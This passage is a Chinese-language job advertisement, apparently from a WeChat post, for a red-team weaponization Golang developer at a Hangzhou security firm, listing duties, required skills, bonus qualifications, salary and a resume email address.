2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至

bountyteam@dbappsecurity.com.cn

岗位：**红队武器化 Golang 开发工程师**  

薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CtGxzWjGs5uX46SOybVAyYzY0p5icTsasu9JSeiaic9ambRjmGVWuvxFbhbhPCQ34sRDicJwibicBqDzJQx8GIM3AQXQ/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVj5U5WuSlmmyiclXwTVYUchicHNenJFpMIDknHR7bBy2ZwkjTRbX38VJ041Yod3eW8uvOicvxiaMH37A/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/0BNKhibhMh8eiasiaBAEsmWfxYRZOZdgDBevusQUZzjTCG5QB8B4wgy8TSMiapKsHymVU4PnYYPrSgtQLwArW5QMUA/640?wx_fmt=gif)

**长按识别二维码关注我们**